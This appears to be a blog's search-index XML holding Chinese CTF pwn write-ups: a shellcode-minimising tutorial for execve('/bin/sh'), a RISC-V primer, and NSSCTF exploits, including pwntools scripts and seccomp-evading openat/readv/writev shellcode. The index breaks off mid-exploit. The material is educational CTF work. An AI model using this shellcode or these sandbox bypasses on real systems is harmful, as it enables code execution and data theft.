<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Shellcode编写入门</title>
      <link href="/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/"/>
      <url>/Shellcode%E7%BC%96%E5%86%99%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="Shellcode编写入门"><a href="#Shellcode编写入门" class="headerlink" title="Shellcode编写入门"></a>Shellcode编写入门</h1><h2 id="为什么要手写shellcode？"><a href="#为什么要手写shellcode？" class="headerlink" title="为什么要手写shellcode？"></a>为什么要手写shellcode？</h2><p>现在的题目对shellcode做了越来越多的限制，比如限制长度，限制特定字符等等。所以一些通用性的shellcode已经很难再起作用，针对某个二进制文件编写特异化shellcode势在必行。</p><span id="more"></span><h2 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h2><p>当然也不可否认shellcode生成工具的便捷性。适当利用也可以辅助我们来编写适合的shellcode。<br>常用的当然是pwntools模块下的shellcraft，比如shellcraft.sh()来生成execve(‘&#x2F;bin&#x2F;sh’,0,0)的汇编代码，还有shellcraft.open(‘flag’,0), shellcode.cat(‘flag’)等等，可以非常方便的生成指定架构下的汇编，<strong>但是pwntools会考虑很多情况（毕竟要考虑通用性的），所以肯定会比较长，实际上是有很大改进空间的</strong>。本篇的目的不是让读者从0开始写shellcode（写的多了也差不多可以直接搓了），只要能改进生成工具生成的shellcode以符合条件就可以了。</p><h2 id="从简化工具生成的shellcode开始"><a href="#从简化工具生成的shellcode开始" class="headerlink" title="从简化工具生成的shellcode开始"></a>从简化工具生成的shellcode开始</h2><p><strong>本篇以execve(‘&#x2F;bin&#x2F;sh’,0,0)为例</strong></p><p>假定我们的架构是x64的<br>先用pwntools生成一段来看看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>shellcraft.sh()</span><br><span class="line">    /* execve(path=<span class="string">&#x27;/bin///sh&#x27;</span>, argv=[<span class="string">&#x27;sh&#x27;</span>], envp=<span class="number">0</span>) */</span><br><span class="line">    /* push <span class="string">b&#x27;/bin///sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x68</span></span><br><span class="line">    mov rax, <span class="number">0x732f2f2f6e69622f</span></span><br><span class="line">    push rax</span><br><span class="line">    mov rdi, rsp</span><br><span class="line">    /* push argument array [<span class="string">&#x27;sh\x00&#x27;</span>] */</span><br><span class="line">    /* push <span class="string">b&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    push <span class="number">0x1010101</span> ^ <span class="number">0x6873</span></span><br><span class="line">    xor dword ptr [rsp], <span class="number">0x1010101</span></span><br><span class="line">    xor esi, esi /* <span class="number">0</span> */</span><br><span class="line">    push rsi /* null terminate */</span><br><span class="line">    push <span class="number">8</span></span><br><span class="line">    pop rsi</span><br><span class="line">    add rsi, rsp</span><br><span class="line">    push rsi /* <span class="string">&#x27;sh\x00&#x27;</span> */</span><br><span class="line">    mov rsi, rsp</span><br><span class="line">    xor edx, edx /* <span class="number">0</span> */</span><br><span class="line">    /* call execve() */</span><br><span class="line">    push SYS_execve /* <span class="number">0x3b</span> */</span><br><span class="line">    pop rax</span><br><span class="line">    syscall</span><br></pre></td></tr></table></figure><p>发现前面<code>push 0x68</code>， 和<code>mov rax，0x732f2f2f6e69622f</code> ,<code>push rax</code> 是把&#x2F;bin&#x2F;&#x2F;&#x2F;sh\x00push到栈上，但是如果没有对&#x2F;bin&#x2F;sh字符串做检测的话可以直接传&#x2F;bin&#x2F;sh\x00, 或者&#x2F;bin&#x2F;&#x2F;sh，所以可以简化为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f</span><br></pre></td></tr></table></figure><p><code>mov rdi, rsp</code>是把指向&#x2F;bin&#x2F;sh字符串的指针传给rdi寄存器，（因为execve的第一个参数实际上需要的是字符串的地址），由于刚刚把&#x2F;bin&#x2F;sh字符串push到栈上（此时在栈顶，也就说rsp此时指向&#x2F;bin&#x2F;sh），所以可以通过mov rdi，rsp把&#x2F;bin&#x2F;sh地址传给rdi寄存器。</p><p>这里非要改的话可以改成：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push rsp</span><br><span class="line">pop rdi</span><br></pre></td></tr></table></figure><p>这样子编译后只有2个字节，原来的用mov传参有3个字节，改写的操作就是把rsp的值push到栈上，在pop到rdi，也能起到传参的效果</p><p><code> push 0x1010101 ^ 0x6873</code>    <code>xor dword ptr [rsp], 0x1010101</code></p><p>这两步应该是为了绕过潜在的sh字串检测，所以先传一个异或后的值，后面再异或回sh，</p><p>如果没有检测的话是可以直接<code>push 0x6873</code> <del><strong>（其实感觉这一大段都没什么用）</strong></del></p><p>后面的<code>xor esi, esi</code>是把rsi置零，使用esi，而不用rsi，是因为用esi编译的字节会少</p><p>然后push 8， pop rsi，就是相当于<code>mov rsi, 8</code>， 用push pop编译出来的更小</p><p><strong>但是直接push一个值到栈上要注意：</strong></p><blockquote><p>  push 只能push一个32位数，超过32位不能编译（起码用pwntools的asm是这样子）</p><p>  push 超过一个字节的数，会自动补全成32位，比如push 0x6873，就会编译为 hsh\x00\x00</p><p>  但是如果只是push一个字节，就会编译为2个字节，比如push 0x8，机器码为 j\x08</p></blockquote><p>后面这段没搞清楚目的是什么，如果只是为了把rsi和rdx置0的话，只需要2行xor就可以了</p><p>最后要给一个系统调用号给rax（x64架构execve调用号是0x3b）</p><p>最后syscall，完成调用！</p><p><del><strong>很好，你已经学会怎么搓shellcode了</strong></del></p><p><strong>完整的汇编码：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span><br><span class="line">push rax</span><br><span class="line">push rsp</span><br><span class="line">pop rdi/* rdi -&gt; /bin/sh */</span><br><span class="line">xor esi, esi/* rsi = 0 */</span><br><span class="line">xor edx, edx/* rdx = 0 */</span><br><span class="line">push 0x3b</span><br><span class="line">pop rax</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>编译成机器码看一看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">mov rax, 0x68732f6e69622f/* /bin/sh\x00 */</span></span><br><span class="line"><span class="string">push rax</span></span><br><span class="line"><span class="string">push rsp</span></span><br><span class="line"><span class="string">pop rdi/* rdi -&gt; /bin/sh */</span></span><br><span class="line"><span class="string">xor esi, esi/* rsi = 0 */</span></span><br><span class="line"><span class="string">xor edx, edx/* rdx = 0 */</span></span><br><span class="line"><span class="string">push 0x3b</span></span><br><span class="line"><span class="string">pop rax</span></span><br><span class="line"><span class="string">syscall&#x27;&#x27;&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;H\xb8/bin/s\x00\x00PT_1\xf61\xd2j;X\x0f\x05&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>只有0x16（22）个字节！！！</strong></p><p>再看看原来的shellcode的机器码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">len</span>(<span class="string">b&#x27;jhH\xb8/bin///sPH\x89\xe7hri\x01\x01\x814$\x01\x01\x01\x011\xf6Vj\x08^H\x01\xe6VH\x89\xe61\xd2j;X\x0f\x05&#x27;</span>)</span><br><span class="line"><span class="number">48</span></span><br></pre></td></tr></table></figure><p>我们缩减了一半多的shellcode代码，并且执行相同的功能，这就是手搓汇编带来的（）</p><h2 id="OK，你已经学会手搓了，现在来实战吧"><a href="#OK，你已经学会手搓了，现在来实战吧" class="headerlink" title="OK，你已经学会手搓了，现在来实战吧"></a>OK，你已经学会手搓了，现在来实战吧</h2><h3 id="【比赛未结束，暂不放wp】moectf-changeable-shellcode"><a href="#【比赛未结束，暂不放wp】moectf-changeable-shellcode" class="headerlink" title="【比赛未结束，暂不放wp】moectf changeable_shellcode"></a>【比赛未结束，暂不放wp】moectf changeable_shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/changeable_shellcode" target="_block">changeable_shellcode</a></p><p><strong>注：比赛还未结束，结束后再补上</strong></p><p>TODO ：基本思路是栈迁移+手搓syscall</p><h3 id="羊城杯-shellcode"><a href="#羊城杯-shellcode" class="headerlink" title="羊城杯 shellcode"></a>羊城杯 shellcode</h3><p><em><strong>附件：</strong></em> <a herf="../resources/pwn_asset/shellcodeBegin/shellcode.zip" target="_block">shellcode.zip</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>RISC-V入门</title>
      <link href="/RISC-V%E5%85%A5%E9%97%A8/"/>
      <url>/RISC-V%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>先写点简单的，后面看情况补充……</strong></p><span id="more"></span><h1 id="什么是RISC-V"><a href="#什么是RISC-V" class="headerlink" title="什么是RISC-V"></a>什么是RISC-V</h1><p>一般常见的处理器架构有x86和arm，x86主要在PC端，ARM主要用于移动终端。</p><p>但是arm有个问题是，设计arm架构芯片需要经过arm公司授权，同时会产生一些费用，但是，假如某天arm公司不授权怎么办？<br>riscv架构就是为了解决此问题，riscv最早起源于加州大学伯克利分校，由于受够了现有处理器架构的夫扎县和相关知识产权的限制，伯克利大学决定发明一种全新的、简单且开放免费的指令集架构。</p><p>从RISC-V名字可以看出，这是risc第5代指令集架构。而riscv目标是“成为一种完全开放的指令集架构，可被任何学术机构或商业组织自由使用“。</p><h1 id="RISC-V通用寄存器"><a href="#RISC-V通用寄存器" class="headerlink" title="RISC-V通用寄存器"></a>RISC-V通用寄存器</h1><table><thead><tr><th>寄存器</th><th>ABI名称</th><th>说明</th></tr></thead><tbody><tr><td>x0</td><td>zero</td><td>0值寄存器，硬编码为0，写入数据忽略，读取数据为0</td></tr><tr><td>x1</td><td>ra</td><td>用于返回地址（return address）</td></tr><tr><td>x2</td><td>sp</td><td>用于栈指针（stack pointer）</td></tr><tr><td>x3</td><td>gp</td><td>用于通用指针（global pointer）</td></tr><tr><td>x4</td><td>tp</td><td>用于线程指针</td></tr><tr><td>x5</td><td>t0</td><td>用于存放临时数据或者备用链接寄存器</td></tr><tr><td>x6~x7</td><td>t1~t2</td><td>用于存放临时数据寄存器</td></tr><tr><td>x8</td><td>s0&#x2F;fp</td><td>需要保存的寄存器或者帧指针寄存器</td></tr><tr><td>x9</td><td>s1</td><td>需要保存寄存器</td></tr><tr><td>x10~x11</td><td>a0~a1</td><td>函数参数或者返回值寄存器</td></tr><tr><td>x12~x17</td><td>a2-a7</td><td>函数传递参数寄存器</td></tr><tr><td>x18~x27</td><td>s2-s11</td><td>需要保存的寄存器</td></tr><tr><td>x28~x31</td><td>t3~t6</td><td>用于存放临时数据寄存器</td></tr></tbody></table><h1 id="常用指令浅析"><a href="#常用指令浅析" class="headerlink" title="常用指令浅析"></a>常用指令浅析</h1><p>一般来说要读懂大致的逻辑只需要常用的读写值，比较跳转这类就可以了，其他个别陌生的可以猜，或者临时去查（很多可以直接猜出来的）</p><ul><li>l（Load）系，l开头的基本就是取值，比如li a5, a4 就是把a4的值取到a5那里</li></ul><blockquote><p>  另外有个比较特殊的是lui，addi，这两个是对li的拓展，一般要传递一个数据（通常是地址）高20位用lui，低12位用addi</p><p>  比如：要传递0x11451419给a5寄存器，就会使用</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>s（store）系，s开头基本表示存值，比如sw a5, -14h(s0)，表示把a5寄存器的值写入s0偏移为-0x14的地址</li></ul><blockquote><p>  l和s有些时候要靠后面的字母来猜具体功能，</p><p>  比如如果是w结尾，想到word，那么sw（store word）就可以猜是写入一个word（2字节）</p><p>  同理还有lw（load word）等</p></blockquote><p><em>当然也不是所有s开头都是表示store，还有比如slli（shift left logical immediate 逻辑左移）</em></p><ul><li>j（jump）系，j开头基本就是跳转了，这里是无条件跳转</li></ul><blockquote><p>  有条件的跳转常常是b开头，比如bgtz a5, label_1 就是把a5寄存的值和0比较，a5为正就会跳转到label_1，为负就继续往下执行；</p><p>  bge a5, a4, label2，比较a5和a4，a5 &gt;&#x3D; a4 跳转到label2，反之继续执行</p></blockquote><p>其他的诸如：mv，call，add，ret这些指令，都比较熟悉，功能也大差不差。</p><h1 id="RISC-V实战"><a href="#RISC-V实战" class="headerlink" title="RISC-V实战"></a>RISC-V实战</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>2023-8下半月比赛wp</title>
      <link href="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/"/>
      <url>/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<ul><li><em>NSSCTF-2nd（pwn方向全部，re两道）</em></li><li>WMCTF（待补充）</li><li><em>SEKAICTF（re一道）</em></li><li><em>也许还有……</em></li></ul><span id="more"></span><h1 id="NSSCTF-2023"><a href="#NSSCTF-2023" class="headerlink" title="NSSCTF-2023"></a>NSSCTF-2023</h1><p>比赛中解出2道re和1道pwn，算是正常发挥了</p><p><em><strong>ls-pwn(finish)：</strong></em></p><ul><li><em>NewBottleOldWine</em></li><li><em>xenny的诱惑</em></li><li><em>happy2</em></li></ul><p><em><strong>ls-re：</strong></em></p><ul><li>MyBase</li><li>Bytecode</li></ul><h2 id="Pwn-NewBottleOldWine"><a href="#Pwn-NewBottleOldWine" class="headerlink" title="Pwn-NewBottleOldWine"></a>Pwn-NewBottleOldWine</h2><p><em><strong>附件：</strong></em><a href="../resources/pwn_asset/2023-8/newBottleOldWine" target="_block">newBottleOldWine</a></p><h3 id="在做题之前："><a href="#在做题之前：" class="headerlink" title="在做题之前："></a>在做题之前：</h3><p>文件是RISC-V架构的，临时学了一点risc-v的汇编：</p><p>做本题大概只需要知道如下几条：</p><ul><li>l（Load）系，l开头的基本就是取值，比如li a5, a4 就是把a4的值取到a5那里</li></ul><blockquote><p>  另外有个比较特殊的是lui，addi，这两个是对li的拓展，一般要传递一个数据（通常是地址）高20位用lui，低12位用addi</p><p>  比如：要传递0x11451419给a5寄存器，就会使用</p><p>  lui a5, 0x11451</p><p>  addi a5, a5, 0x419</p></blockquote><ul><li>s（store）系，s开头基本表示存值，比如sw a5, -14h(s0)，表示把a5寄存器的值写入s0偏移为-0x14的地址</li><li>j（jump）系，j开头基本就是跳转了，这里是无条件跳转</li></ul><blockquote><p>  有条件的跳转常常是b开头，比如bgtz a5, label_1 就是把a5寄存的值和0比较，a5为正就会跳转到label_1，为负就继续往下执行；</p><p>  bge a5, a4, label2，比较a5和a4，a5 &gt;&#x3D; a4 跳转到label2，反之继续执行</p></blockquote><p>其他的诸如：mv，call，add，ret这些指令，都比较熟悉，功能也大差不差。</p><h3 id="汇编码分析"><a href="#汇编码分析" class="headerlink" title="汇编码分析"></a>汇编码分析</h3><p>进去先找找有没有后门：</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/backdoor.png" alt="backdoor" style="zoom:67%;"><p>后门在0x1145162A的位置，可以看到这里用lui和addi传递了一个完整的字符串地址，然后call system，跟进去看这个字符串是&#x2F;bin&#x2F;sh</p><p>然后往上翻发现了两个主要函数：</p><p>一个具有栈溢出漏洞（所以把这个函数改名为了vuln）</p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/vuln.png" alt="vuln" style="zoom: 67%;"><p>另一个应该就是主程序</p><p><em><strong>main前半段：</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_1.png" alt="main_1" style="zoom:67%;"><p>可以看到程序先读入了一个int64，并把值传进qword_11453058</p><p>然后在把qword_11453058的值传给a5寄存器，用sext.w指令把a5拓展</p><blockquote><p>  sext.w的作用是把32位拓展到64位，保留符号，比如-1，十六进制表示为0xffffffff， 拓展为64位就把高32位全部填充1（保证还是和32位符号一致），变成了0xffffffffffffffff； 如果是正数，就把高32位全部填充0；</p></blockquote><p>这里把a5拓展后再和0比较，小于就会继续往下执行到exit，所以这里<strong>a5必须要大于0</strong></p><p>然后如果大于0跳转后，重新从qword_11453058取值到a4寄存器，然后a5赋值为0x9F（159），然后a5， a4比较，如果a5&lt;a4，也就是a4&gt;&#x3D;160就会继续往下执行到exit。</p><p><em><strong>main后半段：</strong></em></p><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/main_2.png" alt="main_2" style="zoom:67%;"><p>所以要保证&gt; 0 &amp;&amp; &lt; 160 才可以跳转到这里，这段逻辑很简单，就是取了qword_11453058的低16位（sw，只取word，也就是2字节），再加上start的地址（就是基地址0x11451400），然后跳转到这个地址。</p><p>一开始的思路是<strong>先跳转到read那里栈溢出到backdoor</strong></p><p>我们发现vuln离start最近，相差0xA0（160），刚好过不了验证。所以需要绕过检测，可以输入一个负数，保证低32位是正数即可。这样在第一步拓展时就是拓展为正数，绕过了第一个检测，然后第二个检测那里由于是负数<strong>（注意前面拓展时是把输入值取到了a5寄存器再对a5拓展，输入的值并没有变）</strong>自然可以绕过检测。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><p><strong>打完才想到可以直接从main跳转到后门那里，都不用栈溢出了</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;node6.anna.nssctf.cn&#x27;</span>, <span class="number">28299</span>)</span><br><span class="line"><span class="comment"># to_vuln_offset = -9223372036854775648</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 1010 0000</span></span><br><span class="line"><span class="comment"># 0x114514a0</span></span><br><span class="line"></span><br><span class="line">to_sh_offset = -<span class="number">9223372036854775254</span></span><br><span class="line"><span class="comment"># 1000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0000 0010 0010 1010</span></span><br><span class="line"><span class="comment"># 0x1145162a</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have?&#x27;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(to_vuln_offset))</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*0x28 + p64(backdoor)</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;bottle&#x27;)</span></span><br><span class="line"><span class="comment">#io.sendline(payload)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="Pwn-xenny的诱惑"><a href="#Pwn-xenny的诱惑" class="headerlink" title="Pwn-xenny的诱惑"></a>Pwn-xenny的诱惑</h2><p>远程会发来一大段数据，拿去base64解出来一个ELF文件</p><p><em><strong>文件：</strong></em><a href="../resources/pwn_asset/2023-8/xenny_map" target="_block">xenny_map</a></p><p>需要先走一段迷宫，然后orw</p><h3 id="迷宫思路："><a href="#迷宫思路：" class="headerlink" title="迷宫思路："></a>迷宫思路：</h3><blockquote><p>  <strong>概况：</strong></p><p>  迷宫太大了，而且每个路口（姑且这么说，1000个函数当作1000个路口），都连通10个路口（对应输入的1-10），如果都不是就回到开始的main（步数，也就是文件里的tmp不会置零，也会+1），要保证刚好第1000步找到xenny。</p></blockquote><p>我懒得分析如何走迷宫了，选择直接随机数爆破：），效果还不错</p><p>本地就先每次启动一个程序，然后设置seed，把走过的每一步都放在一个数组里（我叫做step_arr），然后先走到xenny那里<del>（没到1000步，当然不在）</del>，然后一直发<code>b&#39;\n&#39;</code>，就是一直回到main（发其他的也行，这个阶段就随便乱走，反正本地跑的快，不至于会alarm clock），最后留出来一定步数，再重新跑一遍step_arr（凑够1000次）</p><p><strong>本地：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">sd = <span class="number">1</span></span><br><span class="line">step = <span class="number">0</span></span><br><span class="line">step_arr = []</span><br><span class="line"><span class="comment">#io.recvuntil(b&quot;That&#x27;s all\n&quot;)</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># io = process([&#x27;seccomp-tools&#x27;, &#x27;dump&#x27;, &#x27;./map&#x27;])</span></span><br><span class="line">    io = process(<span class="string">&#x27;./map&#x27;</span>)</span><br><span class="line">    random.seed(sd)</span><br><span class="line">    <span class="keyword">while</span> <span class="string">b&#x27;xenny&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> io.recvline() <span class="keyword">and</span> step &lt; <span class="number">500</span>:</span><br><span class="line">        choice = random.randint(<span class="number">1</span>, <span class="number">10</span>)</span><br><span class="line">        io.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line">        step += <span class="number">1</span></span><br><span class="line">        step_arr.append(choice)</span><br><span class="line">    log.info(<span class="string">&#x27;step: %d&#x27;</span> % step)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(step_arr) == <span class="number">500</span>:</span><br><span class="line">        sd += <span class="number">1</span></span><br><span class="line">        step = <span class="number">0</span></span><br><span class="line">        step_arr = []</span><br><span class="line">        io.close()</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;step_arr: &#x27;</span>, step_arr)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;seed:&#x27;</span>, sd)</span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">len_step_arr = <span class="built_in">len</span>(step_arr)</span><br><span class="line">log.info(<span class="string">&#x27;len_step_arr: %d&#x27;</span> % len_step_arr)</span><br><span class="line"><span class="built_in">print</span>(step_arr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span> - <span class="number">2</span> * len_step_arr):</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> step_arr:</span><br><span class="line">    io.recvline()</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(i))</span><br></pre></td></tr></table></figure><p>要注意的是：<strong>因为要跑2次step_arr，那么这个数组长度不能超过500，所以500后我就重启了程序，（重启记得初始化变量）</strong></p><p><strong>远程：</strong></p><p>远程也差不多这样，不过考虑到有alarm（0x15），测试大概只能收发100多次，所以把临界值改成了150</p><p><code>while b&#39;xenny&#39; not in io.recvline() and step &lt; 150:</code></p><p><code>if len(step_arr) == 150:</code></p><p>在探完路后（搞出来step_arr了），建议一直发非1-10的，触发default返回main，这样可以刷新alarm（）</p><h3 id="沙箱思路："><a href="#沙箱思路：" class="headerlink" title="沙箱思路："></a>沙箱思路：</h3><img src="/2023-8%E4%B8%8B%E5%8D%8A%E6%9C%88%E6%AF%94%E8%B5%9Bwp/sandbox.png" alt="sandbox"><p>可以看到禁了read，write，open，先试了一下直接execve，打不通，应该是执行execve过程中触发了沙箱的某个限制，这里考虑<strong>使用openat，readv，writev函数来拿到flag</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">openat</span><span class="params">(<span class="type">int</span>  dirfd , <span class="type">const</span> <span class="type">char</span> * pathname , <span class="type">int</span>  flags , ... <span class="comment">/* mode_t  mode */</span>)</span>;</span><br></pre></td></tr></table></figure><blockquote><p>  总结起来，如果<code>pathname</code>是绝对路径，则<code>dirfd</code>参数没用。如果<code>pathname</code>是相对路径，并且<code>dirfd</code>的值不是<code>AT_FDCWD</code>，则<code>pathname</code>的参照物是相对于<code>dirfd</code>指向的目录，而不是进程的当前工作目录；反之，如果<code>dirfd</code>的值是<code>AT_FDCWD</code>，<code>pathname</code>则是相对于进程当前工作目录的相对路径，此时等同于<code>open</code></p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 功能：将数据从文件描述符读到分散的内存块中，即分散读</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">readv</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="comment">// 功能：将多块分散的内存数据一并写入文件描述符中，即集中写</span></span><br><span class="line"><span class="type">ssize_t</span> <span class="title function_">writev</span><span class="params">(<span class="type">int</span> fd, <span class="type">const</span> <span class="keyword">struct</span> iovec *iov, <span class="type">int</span> iovcnt)</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">iovec</span> &#123;</span></span><br><span class="line">    <span class="type">void</span>  *iov_base;    <span class="comment">/* 缓冲区首地址 */</span></span><br><span class="line">    <span class="type">size_t</span> iov_len;     <span class="comment">/*缓冲区长度 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><blockquote><p>  readv（）系统调用将从fd读入的数据按一定顺序散布到多个缓冲区，readv会先填满一个再填充下一个</p><p>  writev（）会按顺序，从各个缓冲区中聚集输出数据到fd</p></blockquote><p>程序在0x10000到0x11000有wx权限，不妨直接写在这上面</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload = asm(shellcraft.openat(<span class="number">0</span>, <span class="string">b&quot;/flag&quot;</span>, <span class="number">0</span>))</span><br><span class="line">payload += asm(shellcraft.readv(<span class="number">3</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload += asm(shellcraft.writev(<span class="number">1</span>, <span class="number">0x10100</span>, <span class="number">1</span>))</span><br><span class="line">payload = payload.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;\x90&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x10700</span>) + p64(<span class="number">0x40</span>) <span class="comment"># readv和writev的iov都指向这里，这里起始地址和大小可以随意设置</span></span><br><span class="line">payload += asm(shellcraft.exit(<span class="number">0</span>))</span><br></pre></td></tr></table></figure><p>readv和writev的第二个参数是结构体指针，这里指向0x10100，然后我们在0x10100的位置伪造一个结构体；第三个参数设置1是因为我们只需要一块缓冲区就够了。</p><h3 id="完整exp（远程）："><a href="#完整exp（远程）：" class="headerlink" title="完整exp（远程）："></a>完整exp（远程）：</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 